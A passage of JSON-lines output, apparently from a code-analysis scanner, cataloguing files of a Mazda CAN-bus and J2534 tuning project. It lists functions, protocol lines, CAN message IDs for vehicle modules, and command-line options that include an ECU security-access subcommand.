"Configured OBD service instance"}, {"type": "protocol", "line": 105, "protocol": "OBD", "content": "if backend not in self.OBD_BACKENDS:"}, {"type": "protocol", "line": 106, "protocol": "OBD", "content": "raise ValueError(f\"Unsupported OBD backend: {backend.value}\")"}, {"type": "protocol", "line": 109, "protocol": "OBD", "content": "service_class = self.OBD_BACKENDS[backend]"}, {"type": "protocol", "line": 112, "protocol": "OBD", "content": "self.logger.info(f\"Created OBD service with {backend.value} backend\")"}, {"type": "protocol", "line": 116, "protocol": "OBD", "content": "self.logger.error(f\"Failed to create OBD service with {backend.value}: {e}\")"}, {"type": "protocol", "line": 124, "protocol": "CAN", "content": "Create matching CAN engine and OBD service pair."}, {"type": "protocol", "line": 124, "protocol": "OBD", "content": "Create matching CAN engine and OBD service pair."}, {"type": "protocol", "line": 128, "protocol": "CAN", "content": "can_config: CAN-specific configuration"}, {"type": "protocol", "line": 129, "protocol": "OBD", "content": "obd_config: OBD-specific configuration"}, {"type": "protocol", "line": 132, "protocol": "CAN", "content": "Tuple of (CAN engine, OBD service)"}, {"type": "protocol", "line": 132, "protocol": "OBD", "content": "Tuple of (CAN engine, OBD service)"}, {"type": "protocol", "line": 152, "protocol": "CAN", "content": "return HardwareBackend.PYTHON_CAN"}, {"type": "protocol", "line": 161, "protocol": "J2534", "content": "return HardwareBackend.J2534_PASSTHRU"}, {"type": "protocol", "line": 172, "protocol": "CAN", "content": "Validate if CAN and OBD backends are compatible."}, {"type": "protocol", "line": 172, "protocol": "OBD", "content": "Validate if CAN and OBD backends are compatible."}, {"type": "protocol", "line": 175, "protocol": "CAN", "content": "can_backend: CAN backend"}, {"type": "protocol", "line": 176, "protocol": "OBD", "content": "obd_backend: OBD backend"}, {"type": "protocol", "line": 203, "protocol": "CAN", "content": "Tuple of (CAN engine, OBD service) using auto-detected hardware"}, {"type": "protocol", "line": 203, "protocol": "OBD", "content": "Tuple of (CAN engine, OBD service) using auto-detected hardware"}, {"type": "protocol", "line": 211, "protocol": "CAN", "content": "backend = HardwareBackend.PYTHON_CAN"}], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "index.md", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "installers/build_linux.sh", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "installers/build_macos.sh", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "installers/build_windows.bat", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "j2534_can_engine.py", "lines_read": 449, "features_found": [{"type": "function", "name": "__init__", "line": 27}, {"type": "function", "name": "__init__", "line": 62}, {"type": "function", "name": "_parse_j2534_message", "line": 288}, {"type": "function", "name": "_get_priority_from_id", "line": 360}, {"type": "function", "name": "get_interface_info", "line": 368}, {"type": "function", "name": "get_available_devices", "line": 398}, {"type": "function", "name": "test_connection", "line": 427}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "j2534", "line": null}, {"type": "import", "module": "mazda_can_engine", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "ctypes", "line": null}, {"type": "import", "module": "j2534", "line": null}, {"type": "import", "module": "J2534,", "line": null}, {"type": "import", "module": "MazdaCANEngine,", "line": null}], "components_found": [{"type": "class", "name": "J2534Config", "line": 24}, {"type": "class", "name": "J2534CANEngine", "line": 56}], "algorithms": [], "protocols": [{"type": "protocol", "line": 2, "protocol": "CAN", "content": "J2534CANEngine - Concrete implementation of MazdaCANEngine using J2534 Pass-Thru interface."}, {"type": "protocol", "line": 2, "protocol": "J2534", "content": "J2534CANEngine - Concrete implementation of MazdaCANEngine using J2534 Pass-Thru interface."}, {"type": "protocol", "line": 16, "protocol": "J2534", "content": "from j2534 import J2534, J2534Error"}, {"type": "protocol", "line": 17, "protocol": "J2534", "content": "J2534_AVAILABLE = True"}, {"type": "protocol", "line": 19, "protocol": "J2534", "content": "J2534_AVAILABLE = False"}, {"type": "protocol", "line": 21, "protocol": "CAN", "content": "from mazda_can_engine import MazdaCANEngine, CANMessage, CANInterfaceType, CANState"}, {"type": "protocol", "line": 24, "protocol": "J2534", "content": "class J2534Config:"}, {"type": "protocol", "line": 25, "protocol": "J2534", "content": "\"\"\"Configuration for J2534 Pass-Thru backend.\"\"\""}, {"type": "protocol", "line": 29, "protocol": "J2534", "content": "Initialize J2534 configuration."}, {"type": "protocol", "line": 39, "protocol": "CAN", "content": "self.protocol = config.get('protocol', 'CAN')  # CAN protocol"}, {"type": "protocol", "line": 44, "protocol": "CAN", "content": "self.channel_id = config.get('channel_id', 0)  # First CAN channel"}, {"type": "protocol", "line": 56, "protocol": "CAN", "content": "class J2534CANEngine(MazdaCANEngine):"}, {"type": "protocol", "line": 56, "protocol": "J2534", "content": "class J2534CANEngine(MazdaCANEngine):"}, {"type": "protocol", "line": 58, "protocol": "CAN", "content": "J2534 Pass-Thru based implementation of MazdaCANEngine."}, {"type": "protocol", "line": 58, "protocol": "J2534", "content": "J2534 Pass-Thru based implementation of MazdaCANEngine."}, {"type": "protocol", "line": 59, "protocol": "CAN", "content": "Provides professional-grade CAN interface support."}, {"type": "protocol", "line": 64, "protocol": "CAN", "content": "Initialize J2534 CAN engine."}, {"type": "protocol", "line": 64, "protocol": "J2534", "content": "Initialize J2534 CAN engine."}, {"type": "protocol", "line": 69, "protocol": "J2534", "content": "if not J2534_AVAILABLE:"}, {"type": "protocol", "line": 73, "protocol": "CAN", "content": "super().__init__(interface_type=CANInterfaceType.VECTOR)"}, {"type": "protocol", "line": 76, "protocol": "J2534", "content": "self.j2534_config = J2534Config(config)"}, {"type": "protocol", "line": 80, "protocol": "J2534", "content": "self.j2534: Optional[J2534] = None"}, {"type": "protocol", "line": 84, "protocol": "CAN", "content": "self.logger.info(\"J2534CANEngine initialized\")"}, {"type": "protocol", "line": 84, "protocol": "J2534", "content": "self.logger.info(\"J2534CANEngine initialized\")"}, {"type": "protocol", "line": 86, "protocol": "CAN", "content": "async def connect(self, interface_type: Optional[CANInterfaceType] = None) -> bool:"}, {"type": "protocol", "line": 88, "protocol": "J2534", "content": "Connect to J2534 device."}, {"type": "protocol", "line": 91, "protocol": "J2534", "content": "interface_type: Override interface type (ignored, uses J2534)"}, {"type": "protocol", "line": 96, "protocol": "CAN", "content": "if self.state != CANState.DISCONNECTED:"}, {"type": "protocol", "line": 101, "protocol": "CAN", "content": "self.state = CANState.CONNECTING"}, {"type": "protocol", "line": 105, "protocol": "J2534", "content": "self.j2534 = J2534(self.j2534_config.library_path)"}, {"type": "protocol", "line": 107, "protocol": "J2534", "content": "self.j2534 = J2534()  # Auto-detect"}, {"type": "protocol", "line": 112, "protocol": "J2534", "content": "raise RuntimeError(\"Failed to open J2534 device\")"}, {"type": "protocol", "line": 123, "protocol": "CAN", "content": "raise RuntimeError(\"Failed to connect to CAN channel\")"}, {"type": "protocol", "line": 135, "protocol": "CAN", "content": "self.state = CANState.CONNECTED"}, {"type": "protocol", "line": 144, "protocol": "J2534", "content": "self.logger.info(f\"Connected to J2534 device: {self.device_id}, channel: {self.channel_id}\")"}, {"type": "protocol", "line": 148, "protocol": "CAN", "content": "self.state = CANState.ERROR"}, {"type": "protocol", "line": 149, "protocol": "J2534", "content": "self.logger.error(f\"Failed to connect to J2534 device: {e}\")"}, {"type": "protocol", "line": 154, "protocol": "J2534", "content": "\"\"\"Disconnect from J2534 device.\"\"\""}, {"type": "protocol", "line": 155, "protocol": "CAN", "content": "if self.state == CANState.DISCONNECTED:"}, {"type": "protocol", "line": 160, "protocol": "CAN", "content": "self.state = CANState.DISCONNECTING"}, {"type": "protocol", "line": 173, "protocol": "CAN", "content": "self.state = CANState.DISCONNECTED"}, {"type": "protocol", "line": 174, "protocol": "J2534", "content": "self.logger.info(\"Disconnected from J2534 device\")"}, {"type": "protocol", "line": 178, "protocol": "CAN", "content": "self.state = CANState.ERROR"}, {"type": "protocol", "line": 179, "protocol": "J2534", "content": "self.logger.error(f\"Error disconnecting from J2534 device: {e}\")"}, {"type": "protocol", "line": 183, "protocol": "J2534", "content": "\"\"\"Clean up J2534 connection resources.\"\"\""}, {"type": "protocol", "line": 197, "protocol": "J2534", "content": "self.logger.error(f\"Error during J2534 cleanup: {e}\")"}, {"type": "protocol", "line": 199, "protocol": "CAN", "content": "async def send_message(self, message: CANMessage) -> bool:"}, {"type": "protocol", "line": 201, "protocol": "CAN", "content": "Send CAN message using J2534."}, {"type": "protocol", "line": 201, "protocol": "J2534", "content": "Send CAN message using J2534."}, {"type": "protocol", "line": 204, "protocol": "CAN", "content": "message: CAN message to send"}, {"type": "protocol", "line": 209, "protocol": "CAN", "content": "if self.state != CANState.CONNECTED or not self.j2534 or not self.channel_id:"}, {"type": "protocol", "line": 232, "protocol": "J2534", "content": "self.logger.error(\"J2534 passThruWriteMsg failed\")"}, {"type": "protocol", "line": 237, "protocol": "CAN", "content": "self.logger.error(f\"Failed to send CAN message via J2534: {e}\")"}, {"type": "protocol", "line": 237, "protocol": "J2534", "content": "self.logger.error(f\"Failed to send CAN message via J2534: {e}\")"}, {"type": "protocol", "line": 242, "protocol": "CAN", "content": "\"\"\"Background task to read CAN messages from J2534.\"\"\""}, {"type": "protocol", "line": 242, "protocol": "J2534", "content": "\"\"\"Background task to read CAN messages from J2534.\"\"\""}, {"type": "protocol", "line": 279, "protocol": "J2534", "content": "self.logger.error(f\"Error parsing J2534 message: {e}\")"}, {"type": "protocol", "line": 284, "protocol": "J2534", "content": "self.logger.error(f\"Error reading J2534 messages: {e}\")"}, {"type": "protocol", "line": 288, "protocol": "CAN", "content": "def _parse_j2534_message(self, msg_data: bytes) -> Optional[CANMessage]:"}, {"type": "protocol", "line": 289, "protocol": "CAN", "content": "\"\"\"Parse J2534 message data into CANMessage.\"\"\""}, {"type": "protocol", "line": 289, "protocol": "J2534", "content": "\"\"\"Parse J2534 message data into CANMessage.\"\"\""}, {"type": "protocol", "line": 301, "protocol": "0x[0-9A-Fa-f]+", "content": "extended_id = bool(arbitration_id & 0x80000000)"}, {"type": "protocol", "line": 303, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id &= 0x1FFFFFFF  # Clear extended flag"}, {"type": "protocol", "line": 309, "protocol": "CAN", "content": "return CANMessage("}, {"type": "protocol", "line": 319, "protocol": "J2534", "content": "self.logger.error(f\"Failed to parse J2534 message: {e}\")"}, {"type": "protocol", "line": 323, "protocol": "CAN", "content": "\"\"\"Set up J2534 message filters for Mazda CAN IDs.\"\"\""}, {"type": "protocol", "line": 323, "protocol": "J2534", "content": "\"\"\"Set up J2534 message filters for Mazda CAN IDs.\"\"\""}, {"type": "protocol", "line": 330, "protocol": "0x[0-9A-Fa-f]+", "content": "0x280,  # Engine RPM"}, {"type": "protocol", "line": 331, "protocol": "0x[0-9A-Fa-f]+", "content": "0x281,  # Vehicle Speed"}, {"type": "protocol", "line": 332, "protocol": "0x[0-9A-Fa-f]+", "content": "0x250,  # Throttle Position"}, {"type": "protocol", "line": 333, "protocol": "0x[0-9A-Fa-f]+", "content": "0x311,  # Boost Pressure"}, {"type": "protocol", "line": 334, "protocol": "0x[0-9A-Fa-f]+", "content": "0x310,  # MAP Sensor"}, {"type": "protocol", "line": 335, "protocol": "0x[0-9A-Fa-f]+", "content": "0x290,  # MAF Flow"}, {"type": "protocol", "line": 340, "protocol": "0x[0-9A-Fa-f]+", "content": "mask = 0x7FF if not (can_id & 0x80000000) else 0x1FFFFFFF"}, {"type": "protocol", "line": 353, "protocol": "CAN", "content": "self.logger.warning(f\"Failed to set J2534 filter for CAN ID 0x{can_id:03X}\")"}, {"type": "protocol", "line": 353, "protocol": "J2534", "content": "self.logger.warning(f\"Failed to set J2534 filter for CAN ID 0x{can_id:03X}\")"}, {"type": "protocol", "line": 355, "protocol": "J2534", "content": "self.logger.info(\"J2534 message filters configured\")"}, {"type": "protocol", "line": 358, "protocol": "J2534", "content": "self.logger.error(f\"Failed to set up J2534 filters: {e}\")"}, {"type": "protocol", "line": 361, "protocol": "CAN", "content": "\"\"\"Get priority from CAN arbitration ID.\"\"\""}, {"type": "protocol", "line": 363, "protocol": "0x[0-9A-Fa-f]+", "content": "if arbitration_id < 0x800:"}, {"type": "protocol", "line": 369, "protocol": "J2534", "content": "\"\"\"Get J2534 interface information.\"\"\""}, {"type": "protocol", "line": 380, "protocol": "CAN", "content": "'bus_state': 'connected' if self.state == CANState.CONNECTED else 'disconnected',"}, {"type": "protocol", "line": 381, "protocol": "J2534", "content": "'protocol': 'J2534 Pass-Thru',"}, {"type": "protocol", "line": 392, "protocol": "J2534", "content": "'protocol': 'J2534 Pass-Thru',"}, {"type": "protocol", "line": 399, "protocol": "J2534", "content": "\"\"\"Get list of available J2534 devices.\"\"\""}, {"type": "protocol", "line": 400, "protocol": "J2534", "content": "if not J2534_AVAILABLE:"}, {"type": "protocol", "line": 405, "protocol": "J2534", "content": "j2534 = J2534()"}, {"type": "protocol", "line": 428, "protocol": "J2534", "content": "\"\"\"Test if J2534 connection is working.\"\"\""}, {"type": "protocol", "line": 429, "protocol": "CAN", "content": "if not self.j2534 or not self.channel_id or self.state != CANState.CONNECTED:"}, {"type": "protocol", "line": 434, "protocol": "0x[0-9A-Fa-f]+", "content": "test_msg = bytearray([0x01, 0x00])  # Simple test data"}, {"type": "protocol", "line": 440, "protocol": "OBD", "content": "0x7DF,  # OBD diagnostic request"}, {"type": "protocol", "line": 440, "protocol": "0x[0-9A-Fa-f]+", "content": "0x7DF,  # OBD diagnostic request"}, {"type": "protocol", "line": 447, "protocol": "J2534", "content": "self.logger.error(f\"J2534 connection test failed: {e}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "Provides support for commercial tuning tools and professional ECU communication."}, {"type": "hardware", "line": 331, "hardware": "vehicle", "content": "0x281,  # Vehicle Speed"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "j2534_devices.yml", "lines_read": 13, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "logging.yml", "lines_read": 12, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "logs/muts_20251127.log", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "main.py", "lines_read": 164, "features_found": [{"type": "function", "name": "main", "line": 14}, {"type": "import", "module": "muts.core", "line": null}, {"type": "import", "module": "argparse", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Mazdaspeed3Tuner", "line": null}, {"type": "import", "module": "time", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 26, "hardware": "vehicle", "content": "diag_parser.add_argument('--connect', action='store_true', help='Connect to vehicle')"}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "security_parser = subparsers.add_parser('security', help='Security access functions')"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "security_parser.add_argument('--access', type=str, choices=['dealer', 'manufacturer', 'engineering']"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "help='Request security access level')"}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "security_parser.add_argument('--status', action='store_true', help='Show security status')"}, {"type": "hardware", "line": 84, "hardware": "vehicle", "content": "print(\"Connecting to vehicle...\")"}, {"type": "hardware", "line": 86, "hardware": "vehicle", "content": "print(\"Vehicle connected successfully\")"}, {"type": "hardware", "line": 98, "hardware": "ECU", "content": "elif args.command == 'security':"}, {"type": "hardware", "line": 100, "hardware": "ECU", "content": "print(f\"Requesting {args.access} security access...\")"}, {"type": "hardware", "line": 101, "hardware": "ECU", "content": "result = tuner.dealer_security.perform_security_access(args.access)"}, {"type": "hardware", "line": 104, "hardware": "ECU", "content": "status = tuner.dealer_security.get_security_status()"}, {"type": "hardware", "line": 105, "hardware": "ECU", "content": "print(f\"Security Level: {status['current_level']}\")"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "security_parser.print_help()"}], "security_logic": [{"type": "security_pattern", "line": 73, "pattern": "key", "content": "except KeyboardInterrupt:"}, {"type": "security_pattern", "line": 101, "pattern": "security_access", "content": "result = tuner.dealer_security.perform_security_access(args.access)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "maps_mps3_gen2.yml", "lines_read": 12, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_can_engine.py", "lines_read": 1295, "features_found": [{"type": "function", "name": "__init__", "line": 206}, {"type": "function", "name": "_receive_loop", "line": 435}, {"type": "function", "name": "_process_loop", "line": 462}, {"type": "function", "name": "_get_priority_from_id", "line": 528}, {"type": "function", "name": "_should_accept_message", "line": 540}, {"type": "function", "name": "_check_send_security", "line": 603}, {"type": "function", "name": "add_filter", "line": 621}, {"type": "function", "name": "remove_filter", "line": 629}, {"type": "function", "name": "_update_interface_filters", "line": 637}, {"type": "function", "name": "add_handler", "line": 652}, {"type": "function", "name": "remove_handler", "line": 656}, {"type": "function", "name": "add_error_callback", "line": 666}, {"type": "function", "name": "_notify_error", "line": 670}, {"type": "function", "name": "get_recent_messages", "line": 716}, {"type": "function", "name": "get_statistics", "line": 735}, {"type": "function", "name": "reset_statistics", "line": 743}, {"type": "function", "name": "get_mazda_id_name", "line": 749}, {"type": "function", "name": "is_mazda_id", "line": 756}, {"type": "function", "name": "_is_matching_response", "line": 969}, {"type": "function", "name": "_pad_to_length", "line": 994}, {"type": "function", "name": "get_supported_modules", "line": 1242}, {"type": "function", "name": "__del__", "line": 1291}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "deque,", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "queue", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "python-can", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "can", "line": null}], "components_found": [{"type": "class", "name": "CANState", "line": 24}, {"type": "class", "name": "CANError", "line": 33}, {"type": "class", "name": "CANFrameType", "line": 45}, {"type": "class", "name": "CANInterfaceConfig", "line": 54}, {"type": "class", "name": "CANStatistics", "line": 71}, {"type": "class", "name": "CANError", "line": 92}, {"type": "class", "name": "CANInterfaceError", "line": 97}, {"type": "class", "name": "CANProtocolError", "line": 102}, {"type": "class", "name": "MazdaCANEngine", "line": 107}], "algorithms": [], "protocols": [{"type": "protocol", "line": 2, "protocol": "CAN", "content": "MazdaCANEngine - CAN bus communication and message handling for Mazda vehicles."}, {"type": "protocol", "line": 3, "protocol": "CAN", "content": "Provides low-level CAN interface, message filtering, and protocol handling."}, {"type": "protocol", "line": 4, "protocol": "CAN", "content": "Supports both standard and extended CAN IDs with real-time message processing."}, {"type": "protocol", "line": 19, "protocol": "CAN", "content": "CANMessage, CANFilter, CANPriority, TelemetryData,"}, {"type": "protocol", "line": 20, "protocol": "UDS", "content": "SecurityLevel, SecurityCredentials, LogEntry, UDSRequest, UDSResponse, UDSService, UDSNegativeRespon"}, {"type": "protocol", "line": 24, "protocol": "CAN", "content": "class CANState(Enum):"}, {"type": "protocol", "line": 25, "protocol": "CAN", "content": "\"\"\"CAN interface states.\"\"\""}, {"type": "protocol", "line": 33, "protocol": "CAN", "content": "class CANError(Enum):"}, {"type": "protocol", "line": 34, "protocol": "CAN", "content": "\"\"\"CAN error types.\"\"\""}, {"type": "protocol", "line": 45, "protocol": "CAN", "content": "class CANFrameType(Enum):"}, {"type": "protocol", "line": 46, "protocol": "CAN", "content": "\"\"\"CAN frame types.\"\"\""}, {"type": "protocol", "line": 54, "protocol": "CAN", "content": "class CANInterfaceConfig:"}, {"type": "protocol", "line": 55, "protocol": "CAN", "content": "\"\"\"CAN interface configuration.\"\"\""}, {"type": "protocol", "line": 59, "protocol": "CAN", "content": "fd_mode: bool = False  # CAN FD support"}, {"type": "protocol", "line": 61, "protocol": "CAN", "content": "filters: List[CANFilter] = field(default_factory=list)"}, {"type": "protocol", "line": 71, "protocol": "CAN", "content": "class CANStatistics:"}, {"type": "protocol", "line": 72, "protocol": "CAN", "content": "\"\"\"CAN communication statistics.\"\"\""}, {"type": "protocol", "line": 92, "protocol": "CAN", "content": "class CANError(Exception):"}, {"type": "protocol", "line": 93, "protocol": "CAN", "content": "\"\"\"CAN communication errors.\"\"\""}, {"type": "protocol", "line": 97, "protocol": "CAN", "content": "class CANInterfaceError(CANError):"}, {"type": "protocol", "line": 98, "protocol": "CAN", "content": "\"\"\"CAN interface hardware errors.\"\"\""}, {"type": "protocol", "line": 102, "protocol": "CAN", "content": "class CANProtocolError(CANError):"}, {"type": "protocol", "line": 103, "protocol": "CAN", "content": "\"\"\"CAN protocol errors.\"\"\""}, {"type": "protocol", "line": 107, "protocol": "CAN", "content": "class MazdaCANEngine:"}, {"type": "protocol", "line": 109, "protocol": "CAN", "content": "CAN bus communication engine for Mazda vehicles."}, {"type": "protocol", "line": 110, "protocol": "CAN", "content": "Handles low-level CAN communication, filtering, and message processing."}, {"type": "protocol", "line": 111, "protocol": "UDS", "content": "Includes UDS (Unified Diagnostic Services) support for diagnostic operations."}, {"type": "protocol", "line": 115, "protocol": "CAN", "content": "MAZDA_CAN_IDS = {"}, {"type": "protocol", "line": 117, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ECM_REQUEST\": 0x7E0,      # ECM request ID"}, {"type": "protocol", "line": 118, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ECM_RESPONSE\": 0x7E8,     # ECM response ID"}, {"type": "protocol", "line": 119, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ECM_BROADCAST\": 0x7DF,    # Broadcast to all ECUs"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "\"TCM_REQUEST\": 0x7E1,"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "\"TCM_RESPONSE\": 0x7E9,"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ABS_REQUEST\": 0x7E2,"}, {"type": "protocol", "line": 127, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ABS_RESPONSE\": 0x7EA,"}, {"type": "protocol", "line": 130, "protocol": "0x[0-9A-Fa-f]+", "content": "\"CLUSTER_STATUS\": 0x430,"}, {"type": "protocol", "line": 131, "protocol": "0x[0-9A-Fa-f]+", "content": "\"CLUSTER_REQUEST\": 0x7E3,"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "\"CLUSTER_RESPONSE\": 0x7EB,"}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BCM_REQUEST\": 0x7E4,"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BCM_RESPONSE\": 0x7EC,"}, {"type": "protocol", "line": 139, "protocol": "0x[0-9A-Fa-f]+", "content": "\"SAS_DATA\": 0x0F0,"}, {"type": "protocol", "line": 142, "protocol": "0x[0-9A-Fa-f]+", "content": "\"WHEEL_SPEED_FL\": 0x1A0,"}, {"type": "protocol", "line": 143, "protocol": "0x[0-9A-Fa-f]+", "content": "\"WHEEL_SPEED_FR\": 0x1A1,"}, {"type": "protocol", "line": 144, "protocol": "0x[0-9A-Fa-f]+", "content": "\"WHEEL_SPEED_RL\": 0x1A2,"}, {"type": "protocol", "line": 145, "protocol": "0x[0-9A-Fa-f]+", "content": "\"WHEEL_SPEED_RR\": 0x1A3,"}, {"type": "protocol", "line": 148, "protocol": "0x[0-9A-Fa-f]+", "content": "\"TPS_DATA\": 0x250,"}, {"type": "protocol", "line": 151, "protocol": "0x[0-9A-Fa-f]+", "content": "\"PEDAL_DATA\": 0x251,"}, {"type": "protocol", "line": 154, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BRAKE_PRESSURE\": 0x1A4,"}, {"type": "protocol", "line": 157, "protocol": "0x[0-9A-Fa-f]+", "content": "\"FUEL_PRESSURE\": 0x350,"}, {"type": "protocol", "line": 158, "protocol": "0x[0-9A-Fa-f]+", "content": "\"FUEL_LEVEL\": 0x351,"}, {"type": "protocol", "line": 161, "protocol": "0x[0-9A-Fa-f]+", "content": "\"COOLANT_TEMP\": 0x300,"}, {"type": "protocol", "line": 162, "protocol": "0x[0-9A-Fa-f]+", "content": "\"OIL_TEMP\": 0x301,"}, {"type": "protocol", "line": 163, "protocol": "0x[0-9A-Fa-f]+", "content": "\"IAT_TEMP\": 0x302,"}, {"type": "protocol", "line": 166, "protocol": "0x[0-9A-Fa-f]+", "content": "\"MAP_SENSOR\": 0x310,"}, {"type": "protocol", "line": 167, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BOOST_PRESSURE\": 0x311,"}, {"type": "protocol", "line": 168, "protocol": "0x[0-9A-Fa-f]+", "content": "\"OIL_PRESSURE\": 0x312,"}, {"type": "protocol", "line": 171, "protocol": "0x[0-9A-Fa-f]+", "content": "\"IGNITION_TIMING\": 0x320,"}, {"type": "protocol", "line": 172, "protocol": "0x[0-9A-Fa-f]+", "content": "\"COIL_DWELL\": 0x321,"}, {"type": "protocol", "line": 175, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ENGINE_RPM\": 0x280,"}, {"type": "protocol", "line": 176, "protocol": "0x[0-9A-Fa-f]+", "content": "\"VEHICLE_SPEED\": 0x281,"}, {"type": "protocol", "line": 177, "protocol": "0x[0-9A-Fa-f]+", "content": "\"MAF_FLOW\": 0x290,"}, {"type": "protocol", "line": 180, "protocol": "0x[0-9A-Fa-f]+", "content": "\"O2_SENSOR_1\": 0x360,"}, {"type": "protocol", "line": 181, "protocol": "0x[0-9A-Fa-f]+", "content": "\"O2_SENSOR_2\": 0x361,"}, {"type": "protocol", "line": 182, "protocol": "0x[0-9A-Fa-f]+", "content": "\"EVAP_STATUS\": 0x370,"}, {"type": "protocol", "line": 185, "protocol": "0x[0-9A-Fa-f]+", "content": "\"AIRBAG_STATUS\": 0x400,"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "\"SRS_MODULE\": 0x401,"}, {"type": "protocol", "line": 189, "protocol": "0x[0-9A-Fa-f]+", "content": "\"HVAC_STATUS\": 0x420,"}, {"type": "protocol", "line": 190, "protocol": "0x[0-9A-Fa-f]+", "content": "\"AC_PRESSURE\": 0x421,"}, {"type": "protocol", "line": 193, "protocol": "0x[0-9A-Fa-f]+", "content": "\"LIGHTING_STATUS\": 0x440,"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "\"HEADLIGHT_STATUS\": 0x441,"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "\"POWER_WINDOWS\": 0x460,"}, {"type": "protocol", "line": 198, "protocol": "0x[0-9A-Fa-f]+", "content": "\"POWER_DOORS\": 0x461,"}, {"type": "protocol", "line": 199, "protocol": "0x[0-9A-Fa-f]+", "content": "\"POWER_MIRRORS\": 0x462,"}, {"type": "protocol", "line": 203, "protocol": "UDS", "content": "UDS_DEFAULT_TIMEOUT = 2.0  # seconds"}, {"type": "protocol", "line": 204, "protocol": "UDS", "content": "UDS_MAX_RETRIES = 3"}, {"type": "protocol", "line": 206, "protocol": "CAN", "content": "def __init__(self, config: Optional[CANInterfaceConfig] = None):"}, {"type": "protocol", "line": 208, "protocol": "CAN", "content": "Initialize CAN engine."}, {"type": "protocol", "line": 211, "protocol": "CAN", "content": "config: CAN interface configuration"}, {"type": "protocol", "line": 214, "protocol": "CAN", "content": "self.config = config or CANInterfaceConfig()"}, {"type": "protocol", "line": 